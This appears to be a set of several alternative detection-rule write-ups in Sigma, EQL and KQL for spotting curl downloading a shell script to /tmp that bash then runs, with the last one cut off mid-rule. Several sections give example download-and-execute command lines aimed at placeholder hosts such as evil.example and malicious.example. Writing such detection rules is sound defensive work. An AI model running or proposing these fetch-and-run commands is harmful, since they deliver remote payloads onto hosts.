text:
## Detection rule: `curl` download of `/tmp` bash script followed by `bash` execution

A strong implementation is a **two-event sequence rule**:

1. **`curl` starts and appears to write/download a `.sh` script into `/tmp` or `/var/tmp`.**
2. **`bash` starts and appears to execute a `.sh` script from `/tmp` or `/var/tmp`.**
3. Alert when the execution occurs shortly after the download on the same host/user.

---

## Elastic EQL sequence rule

```eql
// Name: Malicious curl Download to /tmp Followed by Bash Execution
// Type: EQL sequence
// MITRE: T1105 (Ingress Tool Transfer), T1059.004 (Unix Shell)
// Coverage: classic download-and-execute via /tmp bash scripts

sequence by host.name, user.name with maxspan=5m
  [process where event.action == "start"
    and host.name != null
    and user.name != null
    and process.name in ("curl", "/usr/bin/curl", "/bin/curl")
    and (
      // curl URL -o /tmp/script.sh
      // curl URL --output /tmp/script.sh
      // curl URL --output=/tmp/script.sh
      process.command_line =~ /.*(-o|--output)[ =]*(\/tmp|\/var\/tmp)\/.*\.sh.*/

      // curl URL > /tmp/script.sh when the redirect appears in the curl command line
      or process.command_line =~ /.*> *(\/tmp|\/var\/tmp)\/.*\.sh.*/

      // Parent shell command contains the download pattern, e.g.:
      // bash -c "curl https://x -o /tmp/a.sh"
      // bash -c "curl https://x > /tmp/a.sh"
      or process.parent.command_line =~ /.*curl.*(-o|--output|>)[ =]*(\/tmp|\/var\/tmp)\/.*\.sh.*/
    )
  ]
  [process where event.action == "start"
    and host.name != null
    and user.name != null
    and process.name in ("bash", "/bin/bash", "/usr/bin/bash")
    and process.command_line =~ /.*(\/tmp|\/var\/tmp)\/.*\.sh.*/

    // Reduce false positives where the bash event is merely invoking curl,
    // e.g. "bash -c curl ... -o /tmp/x.sh".
    and not process.command_line =~ /.*curl.*/
  ]
```

### Notes on this rule
- Use **`by host.name, user.name`** to correlate the two events on the same endpoint/user.
- If your environment does not reliably populate `user.name`, change it to:
  ```eql
  by host.name
  ```
- For more precision on one-liner command chains, you can use:
  ```eql
  by process.parent.id
  ```
  but this may miss cases where the download and execution happen in separate parent shells.
- If you want stricter `/tmp` only behavior, replace `/tmp|/var/tmp` with `/tmp`.

---

## More conservative variant: `/tmp` only and exact script path

This version avoids matching `/var/tmp` and is slightly lower noise:

```eql
sequence by host.name, user.name with maxspan=5m
  [process where event.action == "start"
    and host.name != null
    and user.name != null
    and process.name in ("curl", "/usr/bin/curl", "/bin/curl")
    and (
      process.command_line =~ /.*(-o|--output)[ =]*\/tmp\/.*\.sh.*/
      or process.command_line =~ /.*> *\/tmp\/.*\.sh.*/
      or process.parent.command_line =~ /.*curl.*(-o|--output|>)[ =]*\/tmp\/.*\.sh.*/
    )
  ]
  [process where event.action == "start"
    and host.name != null
    and user.name != null
    and process.name in ("bash", "/bin/bash", "/usr/bin/bash")
    and process.command_line =~ /.*\/tmp\/.*\.sh.*/
    and not process.command_line =~ /.*curl.*/
  ]
```

---

## Sigma-compatible detection logic

If you use Sigma or need a SIEM that requires separate detections plus correlation, implement two process-creation detections and correlate them.

### Rule 1: `curl` downloads bash script to `/tmp`

```yaml
title: curl Download of Bash Script to /tmp
id: 11111111-1111-1111-1111-111111111111
status: experimental
description: |
  Detects curl downloading or writing a bash script to /tmp or /var/tmp.
  This is often part of malicious download-and-execute behavior.
author: Detection Engineering
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.t1059.004
  - attack.command-and-control
  - attack.t1105
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Process.Image|re: '(^|/)curl$'

  selection_download_option:
    Process.CommandLine|re: '.*(-o|--output)[ =]*(/tmp|/var/tmp)/.*\.sh.*'

  selection_redirect:
    Process.CommandLine|re: '.*> *(\/tmp|/var/tmp)/.*\.sh.*'

  selection_parent_download:
    Process.ParentCommandLine|re: '.*curl.*(-o|--output|>)[ =]*(/tmp|/var/tmp)/.*\.sh.*'

  condition: selection_image and (selection_download_option or selection_redirect or selection_parent_download)
```

### Rule 2: `bash` executes script from `/tmp`

```yaml
title: Bash Execution of /tmp Bash Script
id: 22222222-2222-2222-2222-222222222222
status: experimental
description: |
  Detects bash executing a shell script from /tmp or /var/tmp.
author: Detection Engineering
references:
  - https://attack.mitre.org/techniques/T1059/004/
tags:
  - attack.execution
  - attack.t1059.004
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Process.Image|re: '(^|/)bash$'

  selection_tmp_script:
    Process.CommandLine|re: '.*(\/tmp|\/var\/tmp)\/.*\.sh.*'

  filter_curl_command:
    Process.CommandLine|contains: 'curl'

  condition: selection_image and selection_tmp_script and not filter_curl_command
```

### Sigma-style correlation requirement

Correlate:

```text
Rule 1: curl Download of Bash Script to /tmp
followed by
Rule 2: Bash Execution of /tmp Bash Script
```

within:

```text
5 minutes
```

grouped by:

```text
host.name
user.name
```

Example conceptual correlation:

```yaml
title: curl Download to /tmp Followed by Bash Execution
id: 33333333-3333-3333-3333-333333333333
status: experimental
description: Detects curl downloading a bash script to /tmp followed by bash execution.
correlation:
  type: temporal
  rules:
    - 11111111-1111-1111-1111-111111111111
    - 22222222-2222-2222-2222-222222222222
  group_by:
    - host.name
    - user.name
  timespan: 5m
```

Depending on your Sigma processor, correlation syntax may vary slightly. The important part is the sequence condition:

```text
curl_download -> bash_execution within 5m, same host/user
```

---

## Single-event high-confidence variant for shell one-liners

If the malicious command is executed as one shell one-liner, e.g.:

```bash
curl https://malicious.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh
```

or:

```bash
bash -c "curl https://malicious.example/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

you can detect the parent `bash` command directly:

```eql
process where event.action == "start"
  and process.name in ("bash", "/bin/bash", "/usr/bin/bash")
  and process.command_line =~ /.*curl.*(-o|--output|>)[ =]*(\/tmp|\/var\/tmp)\/.*\.sh.*&&.*bash.*\/tmp.*\.sh.*/
```

More flexible version that also catches `source`, `cat`, or direct invocation patterns:

```eql
process where event.action == "start"
  and process.name in ("bash", "/bin/bash", "/usr/bin/bash")
  and process.command_line =~ /.*curl.*(-o|--output|>)[ =]*(\/tmp|\/var\/tmp)\/.*\.sh.*/
  and process.command_line =~ /.*(bash|source|cat|\/tmp).*\/tmp.*\.sh.*/
```

This is less generic than the sequence rule but often high confidence for one-liner delivery.

---

## False-positive tuning guidance

This behavior can legitimately appear during:

- manual administration
- software installation scripts
- bootstrap tools
- CI/CD runners
- Ansible/Salt/Chef/Puppet operations
- developer workflows
- security tools downloading scanner scripts

Common exclusions can be added to both sequence events:

```eql
and not (
  process.command_line =~ /.*(\/tmp\/\.cache|\/tmp\/pip-|\/tmp\/ansible|\/tmp\/salt|\/tmp\/npm|\/tmp\/\.m2|\/tmp\/venv)/
  or process.parent.name in ("ansible", "chef-client", "salt", "puppet", "systemd")
)
```

You can also exclude known benign command-line substrings, such as:

```eql
and not process.command_line =~ /.*\/tmp\/(install|setup|bootstrap|test|build)\.sh.*/
```

But be careful with broad exclusions. Malware often names scripts similarly to legitimate bootstrap files.

text:
Below is a portable **Sigma correlation rule** for Linux process-creation telemetry. It detects the two-stage behavior:

1. `curl` downloads/writes a bash script into `/tmp`
2. `bash` later executes a script from `/tmp`

> Use this as a **correlation rule**. If your platform does not support correlation, split it into the two Stage 1 and Stage 2 alerts and correlate by host/user/session within the time window.

```yaml
title: Malicious Bash Script Download via curl to /tmp Followed by Execution
id: 8d797d2e-8d91-5d9b-8a55-73d1c7b2d9f3
status: experimental
description: >
  Detects a curl process downloading or writing a bash script to /tmp, followed by
  execution of a bash script from /tmp. This pattern is commonly observed with Linux
  malware using classic download-and-execute delivery techniques.
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.command_and_scripting_interpreter
  - attack.t1059.004
  - attack.command_and_control
  - attack.t1105
logsource:
  product: linux
  category: process_creation

detection:
  # Stage 1:
  # Detect curl downloading or writing a .sh script into /tmp.
  curl_download_to_tmp_script:
    selection_image:
      Image|endswith:
        - /curl
        - /usr/bin/curl
        - /usr/local/bin/curl
    selection_output_file:
      CommandLine|re:
        - '(?i)(?:^|\s)-o\s*=?\s*[^
\s]*\/tmp\/[^
\s]*\.sh(?:\s|$)'
        - '(?i)(?:^|\s)--output\s*=?\s*[^
\s]*\/tmp\/[^
\s]*\.sh(?:\s|$)'
    selection_output_dir:
      CommandLine|re:
        - '(?i)(?:^|\s)--output-dir\s*=?\s*[^
\s]*\/tmp\b\s+[^
\s]*\.sh\b'
    selection_remote_name:
      CommandLine|contains|all:
        - ' -O '
        - '.sh'
      CurrentDirectory|endswith:
        - /tmp
    condition: >
      selection_image and
      (
        selection_output_file or
        selection_output_dir or
        selection_remote_name
      )

  # Stage 2:
  # Detect bash executing a script located in /tmp.
  bash_exec_tmp_script:
    selection_image:
      Image|endswith:
        - /bash
        - /bin/bash
        - /usr/bin/bash
        - /usr/local/bin/bash
    selection_command_line:
      CommandLine|re:
        - '(?i)(?:^|\s|")\/tmp\/[^
\s]*\.sh(?:\s|$|")'
    condition: selection_image and selection_command_line

  # Correlate the two stages:
  # curl downloads /tmp script, then bash executes /tmp script
  # within a short time window for the same host and user.
  correlation:
    type: sequence
    events:
      - rule: curl_download_to_tmp_script
      - rule: bash_exec_tmp_script
    group-by:
      - Hostname
      - User
    sequence-max-span: 5m
    condition: curl_download_to_tmp_script then bash_exec_tmp_script

fields:
  - Timestamp
  - Hostname
  - User
  - Image
  - CommandLine
  - ParentCommandLine
  - CurrentDirectory

falsepositives:
  - Legitimate software installers that download bootstrap scripts to /tmp.
  - Package managers, vendor installers, update frameworks, or deployment tools.
  - CI/CD agents or build pipelines running one-off shell scripts from /tmp.
  - Administrators manually executing trusted installation scripts.

level: high
```

## What this detects

This rule looks for patterns similar to:

```bash
curl http://malicious.example.com/payload.sh -o /tmp/payload.sh
bash /tmp/payload.sh
```

Examples that should trigger the sequence:

```bash
curl -o /tmp/install.sh http://host/install.sh
curl --output /tmp/maintenance.sh http://host/maintenance.sh
curl --output-dir /tmp http://host/agent.sh
curl -O http://host/update.sh   # if running from /tmp
bash /tmp/update.sh
```

## Important detection assumptions

The rule assumes your process-creation logs include normalized fields similar to:

- `Image`
- `CommandLine`
- `ParentCommandLine`
- `CurrentDirectory`
- `Hostname`
- `User`

If your EDR uses different field names, map accordingly, for example:

```text
Image            -> process.executable
CommandLine      -> process.cmdline
ParentCommandLine -> parent_process.cmdline
CurrentDirectory -> process.working_directory
```

## Optional improvements

### Include `wget`

If you also want to detect the same behavior using `wget`, add `wget` to Stage 1 and adjust the command-line matching:

```bash
wget -O /tmp/payload.sh http://host/payload.sh
bash /tmp/payload.sh
```

A simple extension would match:

```text
Image|endswith:
  - /wget
CommandLine matches:
  - -O
  - --output-document
  - /tmp
  - .sh
```

### Include `/var/tmp`

Many Linux malware samples also use `/var/tmp`. If desired, broaden `/tmp` matching to:

```text
/tmp
/var/tmp
```

For example:

```bash
curl http://host/payload.sh -o /var/tmp/payload.sh
bash /var/tmp/payload.sh
```

### Add pipe-to-shell detection

The rule above intentionally focuses on “download file to `/tmp`, then execute script.” A very close variant is classic pipe-to-shell malware delivery:

```bash
curl http://host/payload.sh | bash
```

That pattern can be detected separately, or added as a companion Stage 2 variant:

```yaml
bash_pipe_to_shell:
  selection_image:
    Image|endswith:
      - /bash
      - /bin/bash
      - /usr/bin/bash
  selection_pipe:
    ParentCommandLine|re:
      - '(?i)(?:^|\s)curl\b[^
]*\|\s*(?:bash|sh)\b'
    CommandLine|re:
      - '(?i)(?:^|\s|")\/tmp\b'
  condition: selection_image and selection_pipe
```

However, pipe-to-shell is noisy on developer hosts, so tune before alerting.

## Suggested production tuning

Before deploying at a high-severity alerting level:

1. Run the rule in **monitor-only** mode for one full deployment cycle.
2. Identify legitimate software installers, update frameworks, or build agents.
3. Add environment-specific allow lists only where necessary.
4. Prefer parent-process-based allow listing over broad command-line exclusions.

Example conceptual allow-list pattern:

```text
Do not alert if ParentCommandLine is known-good deployment tool
and both curl and bash are run under that parent in a trusted directory.
```

Avoid generic exclusions like:

```text
CommandLine contains "update"
```

because malware frequently names payloads `update.sh`, `install.sh`, `systemd.sh`, `sshd.sh`, etc.

text:
Below is a portable, correlation-based detection rule for Linux process telemetry. It detects the classic pattern where `curl` writes or downloads a `.sh` script into `/tmp`, followed shortly by execution of a script in `/tmp` by `bash`/`sh`.

## Rule: `curl` Downloads Bash Script to `/tmp`, Followed by Execution

```yaml
title: curl Downloads Bash Script to /tmp Followed by Execution
id: 9f73f61e-3d58-4c11-9d3b-6c0f8e4351c2
status: experimental
description: >
  Detects suspicious download-and-execute behavior where a curl process
  downloads or writes a Bash script into /tmp, followed within a short
  time window by bash/sh execution of a script from /tmp. This pattern is
  commonly used by malware droppers and remote script execution tools.
author: Security Agent
date: 2026-05-21
severity: high
references:
  - https://attack.mitre.org/techniques/T1059/004/
  - https://attack.mitre.org/techniques/T1105/
tags:
  - attack.execution
  - attack.command_and_control
  - attack.t1059.004
  - attack.t1105

logsource:
  category: process_creation
  product: linux

detection:
  curl_download:
    selection:
      Image|endswith:
        - '/curl'
        - '/curl.exe'
      CommandLine|contains|all:
        - '/tmp/'
        - '.sh'
    download_method:
      CommandLine|contains|any:
        - ' -o /tmp/'
        - ' -o/tmp/'
        - ' --output /tmp/'
        - ' -O /tmp/'
        - ' > /tmp/'
        - '>/tmp/'
    remote_payload:
      CommandLine|contains|any:
        - 'http://'
        - 'https://'
        - 'ftp://'
    condition: selection and download_method and remote_payload

  bash_execution:
    selection:
      Image|endswith:
        - '/bash'
        - '/sh'
        - '/dash'
        - '/ash'
      CommandLine|contains|all:
        - '/tmp/'
        - '.sh'
    condition: selection

correlation:
  type: temporal
  rules:
    - curl_download
    - bash_execution
  timespan: 2m
  group_by:
    - HostName
    - UserName
  fields:
    - HostName
    - UserName
    - Image
    - ParentImage
    - CommandLine
    - ParentCommandLine
```

---

## Core Detection Logic

```text
1. curl process creates/downloads file:
   command_line contains "/tmp/"
   command_line contains ".sh"
   command_line contains one of:
     "-o", "--output", "-O", ">"
   command_line contains URL:
     "http://", "https://", "ftp://"

2. Within 2 minutes:
   bash/sh process executes file:
     command_line contains "/tmp/"
     command_line contains ".sh"

Condition:
  curl_download AND followed_by bash_execution within 2m
```

---

## Example Malicious Sequence Detected

```bash
curl -o /tmp/malware.sh https://evil.example/malware.sh
bash /tmp/malware.sh
```

Also detects variants such as:

```bash
curl https://evil.example/malware.sh > /tmp/malware.sh
bash /tmp/malware.sh
```

```bash
curl --output /tmp/update.sh http://example.com/update.sh
sh /tmp/update.sh
```

---

## If Your SIEM Does Not Support Correlation Rules

Split the rule into two detections and correlate them manually.

### Rule 1 — `curl` Downloads Script to `/tmp`

```yaml
title: curl Downloads Bash Script to /tmp
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/curl'
      - '/curl.exe'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
      - 'http'
  filter_output:
    CommandLine|contains|any:
      - ' -o /tmp/'
      - ' -o/tmp/'
      - ' --output /tmp/'
      - ' > /tmp/'
      - '>/tmp/'
  condition: selection and filter_output
```

### Rule 2 — `bash` Executes Script from `/tmp`

```yaml
title: bash Executes Script from /tmp
logsource:
  category: process_creation
  product: linux
detection:
  selection:
    Image|endswith:
      - '/bash'
      - '/sh'
      - '/dash'
      - '/ash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
  condition: selection
```

Correlate:

```text
Rule 1 followed by Rule 2 within 2 minutes
grouped by host and user
```

---

## Field Mapping Notes

Depending on your telemetry source, map the rule fields like this:

| Sigma Field        | Common Field Name            |
|--------------------|------------------------------|
| `Image`            | `process.name`, `process.path`, `process.executable` |
| `CommandLine`      | `process.args`, `process.cmdline`, `process.command_line` |
| `ParentImage`      | `parent.process.name`, `parent.process.path` |
| `HostName`         | `host.name`, `hostname`      |
| `UserName`         | `user.name`, `username`      |

---

## Tuning Recommendations

To reduce false positives, consider excluding known administrative or package-manager behavior:

```yaml
filter_legitimate:
  ParentImage|contains:
    - '/apt'
    - '/dpkg'
    - '/systemd'
  CommandLine|contains:
    - '/usr/share/'
```

Legitimate cases that may trigger this rule:

- Bootstrap scripts installed by administrators.
- Cloud initialization tools.
- Software installers that download helper scripts to `/tmp`.
- Penetration testing or administrative maintenance.

If you want narrower detections, also require network indicators, suspicious parent processes, or unsigned/unknown binaries.

text:
Use a temporal/sequence detection. Below is a portable Sigma rule, followed by a KQL rule that explicitly enforces “curl writes/executes to `/tmp` first, then `bash` executes the same `/tmp` script path.”

## Sigma rule: curl download to `/tmp` followed by bash execution

```yaml
title: Malicious Download-and-Execute - curl Writing to /tmp Followed by Bash Execution
description: |
  Detects when a curl process writes or outputs a bash script under /tmp, followed within
  10 minutes by a bash process executing a script under /tmp. This pattern is consistent with
  classic download-and-execute malware delivery.

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059.004/

author: Security Detection Team
date: 2026-06-15
status: experimental

logsource:
  product: linux
  category: process_creation

detection:
  curl_download:
    Image|endswith:
      - '/curl'
      - '/bin/curl'
      - '/usr/bin/curl'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
    CommandLine|contains:
      - '-o'
      - '--output'
      - '> /tmp/'
      - '>/tmp/'

  bash_execution:
    Image|endswith:
      - '/bash'
      - '/bin/bash'
      - '/usr/bin/bash'
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'

  condition: curl_download and bash_execution

correlation:
  type: temporal
  rules:
    - curl_download
    - bash_execution
  timespan: 10m
  group-by:
    - host.id

falsepositives:
  - Legitimate software installers
  - CI/CD bootstrap scripts
  - Administrative patching scripts
  - Update frameworks staging shell scripts in /tmp

level: high

tags:
  - attack.execution
  - attack.command_and_control
  - t1105
  - t1059.004
```

---

## KQL / Elastic / Microsoft Sentinel style rule: ordered same-file sequence

This is often better than a simple two-event match because it requires the same `/tmp/*.sh` path in both steps.

```kql
let TimeWindow = 10m;

// Step 1: curl writes/downloads an executable shell script under /tmp
let curl_events =
  process_events
  | where event.action == "start"
  | where process.name =~ /curl(\.exe)?$/
  | extend command_line = coalesce(process.command_line, "")
  | where command_line =~ /(-o\s+|--output-dir\s+|--output\s*=?|>\s*)["']?\/tmp\/[^\s"']+\.sh/
  | extend script_path = extractregex(command_line, "(\/tmp\/[^\s\"']+\.sh)", 1)
  | project
      device_id = host.id,
      curl_timestamp = event.timestamp,
      curl_process_id = process.pid,
      script_path

// Step 2: bash executes a shell script under /tmp
| let bash_events =
  process_events
  | where event.action == "start"
  | where process.name =~ /bash(\.exe)?$/
  | extend command_line = coalesce(process.command_line, "")
  | where command_line =~ /\/tmp\/[^\s"']+\.sh/
  | extend script_path = extractregex(command_line, "(\/tmp\/[^\s\"']+\.sh)", 1)
  | project
      device_id = host.id,
      bash_timestamp = event.timestamp,
      bash_process_id = process.pid,
      script_path

// Correlate: curl writes/downloads the script first, bash executes it afterward
curl_events
| join kind=inner bash_events on device_id, script_path
| where bash_timestamp > curl_timestamp
| where (bash_timestamp - curl_timestamp) <= TimeWindow
| project
    device_id,
    script_path,
    curl_timestamp,
    bash_timestamp,
    curl_process_id,
    bash_process_id,
    alert = "Malicious download-and-execute pattern: curl -> /tmp script -> bash execution"
```

### Field-name notes

- If using **Microsoft Defender for Endpoint / Sentinel**, replace:
  - `process_events` with `DeviceProcessEvents`
  - `event.action == "start"` with something like `ActionType == "ProcessCreated"`
  - `process.name` with `FileName`
  - `process.command_line` with `ProcessCommandLine`
  - `host.id` with `DeviceId`
  - `event.timestamp` with `Timestamp`
  - `process.pid` with `ProcessId`

Example core filters:

```kql
| where ActionType == "ProcessCreated"
| where FileName in ("curl", "curl.exe", "bash", "bash.exe")
```

- If using **Sysmon for Linux**, you may need:
  - `process.name` -> `Image` basename or full path
  - `process.command_line` -> `CommandLine`
  - `host.id` -> `ComputerName` or `HostName`, depending on your SIEM schema

### Detection logic summary

The rule looks for:

1. `curl` creating or writing an executable script to `/tmp`, for example:
   - `curl https://example.com/script.sh -o /tmp/payload.sh`
   - `curl https://example.com/script.sh --output /tmp/payload.sh`
   - `curl https://example.com/script.sh > /tmp/payload.sh`

2. Within a short time window, `bash` executing a script from `/tmp`, for example:
   - `bash /tmp/payload.sh`
   - `bash -c "source /tmp/payload.sh"`
   - `bash -c "/tmp/payload.sh"`

3. Preferably the same `/tmp/*.sh` file path is used in both steps.

### Recommended tuning

To reduce false positives, add allowlists for known benign activity, such as:

- Software installers and update frameworks
- CI/CD runners
- Kubernetes or container bootstrap scripts
- Administrative patching tools
- Known parent processes such as `/usr/bin/pip`, `/usr/bin/apt`, `/usr/local/bin/tool`, etc.

If telemetry supports file creation events, you can strengthen the first step by detecting `curl` creating `/tmp/*.sh` via file events rather than relying only on the command line.

text:
Below is a detection rule set for the “download‑and‑execute” pattern:

> `curl` downloads a Bash script into `/tmp`, and a `bash`/`sh` process later executes a script from `/tmp`.

The rules assume Linux process-creation telemetry with fields equivalent to:

- `Image`: full process executable path
- `CommandLine`: command line used to start the process
- `host`: host identifier

Adjust field names for your log source, for example Sysmon for Linux, CrowdStrike Falcon, Elastic EDR, Wazuh, etc.

---

## 1. Sigma atomic rule: curl downloads Bash script to `/tmp`

```yaml
title: Curl Downloads Bash Script to /tmp
id: 3f7c9f16-2f1d-4d59-9d63-37e2f3f981c6
status: experimental
description: >
  Detects curl writing a .sh file into /tmp using -o/--output redirection.
  This can indicate staging of a Bash script for later execution.
references:
  - https://attack.mitre.org/techniques/T1105/
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image|endswith:
      - '/curl'
  selection_output_arg:
    CommandLine|contains:
      - ' -o /tmp/'
      - ' -o"/tmp/'
      - " -o'/tmp/"
      - ' -o=/tmp/'
      - ' --output /tmp/'
      - '--output="/tmp/'
      - "--output='/tmp/"
      - '--output=/tmp/'
      - '> /tmp/'
      - '>/tmp/'
      - '1> /tmp/'
      - '1>/tmp/'
      - '>> /tmp/'
      - '>>/tmp/'
  selection_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
  condition: all of selection*
falsepositives:
  - Legitimate software provisioning or installer scripts downloaded to /tmp
level: medium
tags:
  - attack.command_and_control
  - attack.t1105
```

---

## 2. Sigma atomic rule: bash/sh executes Bash script from `/tmp`

```yaml
title: Bash Executes Script From /tmp
id: 7159d60b-9d8b-47f9-a39a-0a617a81d221
status: experimental
description: >
  Detects bash or sh executing a script file located in /tmp.
references:
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image|endswith:
      - '/bash'
      - '/sh'
  selection_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
  condition: all of selection*
falsepositives:
  - Administrative or CI/CD scripts stored in /tmp
  - Temporary debugging scripts
level: medium
tags:
  - attack.execution
  - attack.t1059.004
```

---

## 3. Sigma correlation rule: curl download to `/tmp` followed by bash execution

```yaml
title: Curl Downloads Bash Script to /tmp Followed by Bash Execution
id: e37f19d1-7c8f-474b-b85d-1d70f42a25e1
status: experimental
description: >
  Detects a classic download-and-execute malware pattern where curl downloads
  a Bash script to /tmp and a bash/sh process later executes a script from /tmp.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  category: process_creation
  product: linux
detection:
  curl_download_to_tmp:
    rule: 3f7c9f16-2f1d-4d59-9d63-37e2f3f981c6
    type: all
  bash_script_execution_from_tmp:
    rule: 7159d60b-9d8b-47f9-a39a-0a617a81d221
    type: all
  condition: curl_download_to_tmp and bash_script_execution_from_tmp
  timeframe: 30s
  group-by:
    - host
falsepositives:
  - Legitimate installers downloaded by administrators
  - CI/CD jobs that stage scripts in /tmp before executing them
level: high
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
```

---

## Optional atomic rule: one-line download-and-execute inside Bash

Attackers often combine download and execution in one command, for example:

```bash
bash -c "curl https://example.com/payload.sh -o /tmp/payload.sh && bash /tmp/payload.sh"
```

Use this rule as an additional standalone detection if your correlation platform does not support sequence correlation well.

```yaml
title: One-Line Curl Download and Bash Execution From /tmp
id: 22e3761f-b761-4483-8e1f-b933f1313212
status: experimental
description: >
  Detects bash or sh executing a command line that contains curl and a
  downloaded Bash script path under /tmp.
references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/
logsource:
  category: process_creation
  product: linux
detection:
  selection_image:
    Image|endswith:
      - '/bash'
      - '/sh'
  selection_curl_command:
    CommandLine|contains:
      - 'curl '
  selection_output_arg:
    CommandLine|contains:
      - ' -o /tmp/'
      - ' -o"/tmp/'
      - " -o'/tmp/"
      - ' -o=/tmp/'
      - ' --output /tmp/'
      - '--output="/tmp/'
      - "--output='/tmp/"
      - '--output=/tmp/'
      - '> /tmp/'
      - '>/tmp/'
      - '1> /tmp/'
      - '1>/tmp/'
      - '>> /tmp/'
      - '>>/tmp/'
  selection_tmp_script:
    CommandLine|contains|all:
      - '/tmp/'
      - '.sh'
  condition: all of selection*
falsepositives:
  - Legitimate administrative scripts
level: high
tags:
  - attack.command_and_control
  - attack.execution
  - attack.t1105
  - attack.t1059.004
```

---

## Alternative: Elastic EQL sequence rule

If your platform supports EQL sequences, this rule explicitly enforces event ordering: `curl` download first, then `bash` execution.

```eql
sequence by host.id with maxspan=30s
  [process where host.os.type == "linux" and event.action == "process-start"
    and process.name == "curl"
    and (
      process.command_line : "* -o /tmp/*.sh*" or
      process.command_line : "*-o=/tmp/*.sh*" or
      process.command_line : "* -o \"/tmp/*.sh*\"" or
      process.command_line : "* -o '/tmp/*.sh*'" or
      process.command_line : "* --output /tmp/*.sh*" or
      process.command_line : "*--output=/tmp/*.sh*" or
      process.command_line : "* --output \"/tmp/*.sh*\"" or
      process.command_line : "* --output '/tmp/*.sh*'" or
      process.command_line : "*> /tmp/*.sh*" or
      process.command_line : "*>/tmp/*.sh*"
    )
  ]
  [process where host.os.type == "linux" and event.action == "process-start"
    and process.name in ("bash", "sh")
    and (
      process.command_line : "* /tmp/*.sh*" or
      process.command_line : "*bash /tmp/*.sh*" or
      process.command_line : "*sh /tmp/*.sh*" or
      process.command_line : "* -c /tmp/*.sh*" or
      process.command_line : "* -c \"/tmp/*.sh*\"" or
      process.command_line : "* -c '/tmp/*.sh*'" or
      process.command_line : "*source /tmp/*.sh*" or
      process.command_line : "*source \"/tmp/*.sh*\"" or
      process.command_line : "*source '/tmp/*.sh*'"
    )
  ]
```

## Tuning guidance

- Increase `timeframe` from `30s` to `60s` or `120s` if downloads are slow.
- To reduce false positives, exclude known provisioning hosts, package managers, Ansible runners, or trusted CI/CD nodes.
- For higher coverage, remove the `.sh` extension requirement from the execution rule, but expect more false positives.
- If `bash -c "curl ... | bash"` matters in your environment, add a separate detection for that pipe-to-shell pattern as well.

text:
Below is a practical detection rule for the described “download-and-execute” pattern:

> **`curl` downloads a bash script into `/tmp`**, then a **`bash`/`sh`** process executes a file from `/tmp`.

Because this is inherently a **two-step behavior**, the most accurate implementation is a **process sequence/correlation rule** rather than a single-event rule where possible.

---

## Detection Rule: Curl Download to /tmp Followed by Bash Execution

### Rule Name
**Malicious Download-and-Execute: curl writes script under /tmp, followed by bash/sh execution**

### ATT&CK Mapping
- **T1105** - Ingress Tool Transfer
- **T1059.004** - Command and Scripting Interpreter: Unix Shell

### Event Source
Use Linux process creation telemetry:
- Sysmon for Linux
- `auditd` / `execve` syscall events
- EDR process events
- Optional: file creation events showing `curl` writing to `/tmp`

### Fields Used
Adjust field names to your platform, for example:
- `process.name` / `Image` / `FileName`
- `process.command_line` / `CommandLine` / `ProcessCommandLine`
- `file.name` / `TargetFilename` / `FilePath`
- `host.name` / `HostName`
- `process.parent_id` / `ParentProcessGuid` / `ppid`

---

## Core Rule Logic

```text
Rule Type:
  Process sequence / correlation

Description:
  Detects classic malware delivery where curl downloads an executable shell
  script to /tmp, followed by execution of that script using bash or sh.

Time Window:
  120 seconds

Correlation Scope:
  Same host
  Preferred: same process tree / parent process lineage
  Acceptable: same host if process tree correlation is unavailable

Step 1: curl download to /tmp
  Event:
    process_creation

  Condition:
    process_name matches:
      */curl
      */curl.exe
      curl

    command_line matches one of:
      * -o /tmp/*
      * --output /tmp/*
      * -O /tmp/*
      * > /tmp/*

    Optional file write event:
      created_file_path starts with /tmp/
      created_file_path is executable or is a shell script:
        .sh
        .bash
        shebang: #!/bin/bash or #!/bin/sh

Step 2: bash/sh execution of /tmp script
  Event:
    process_creation

  After:
    Step 1
    Within: 120 seconds
    Scope: same host, preferably same process tree

  Condition:
    process_name matches:
      */bash
      */sh
      bash
      sh

    command_line matches:
      bash /tmp/*
      sh /tmp/*
      */tmp/*.sh
      */tmp/*.bash
      -c * /tmp/*
      -c * && * /tmp/*
```

---

## Sigma-Style Rule

Sigma syntax varies by backend. The logic below is written as a **correlation/sequence detection rule**. If your Sigma backend supports correlations, convert it accordingly. If not, split it into two rules and correlate them in your SIEM/EDR.

```yaml
title: Malicious Download-and-Execute via curl /tmp / bash
description: >
  Detects a curl process downloading an executable shell script to /tmp
  followed by bash or sh executing a script from /tmp. This behavior is
  consistent with common malware delivery techniques.
author: Detection Engineer
status: experimental
date: 2026-01-30

references:
  - https://attack.mitre.org/techniques/T1105/
  - https://attack.mitre.org/techniques/T1059/004/

logsource:
  category: process_creation
  product: linux
  # service: sysmon/auditd/edr

detection:
  step1_curl_download:
    Image|endswith:
      - '/curl'
      - 'curl.exe'
    CommandLine|contains|all:
      - '-o'
      - '/tmp/'
    # Optional high-confidence file write condition:
    # TargetFilename|startswith: '/tmp/'

  step2_bash_execution:
    Image|endswith:
      - '/bash'
      - '/sh'
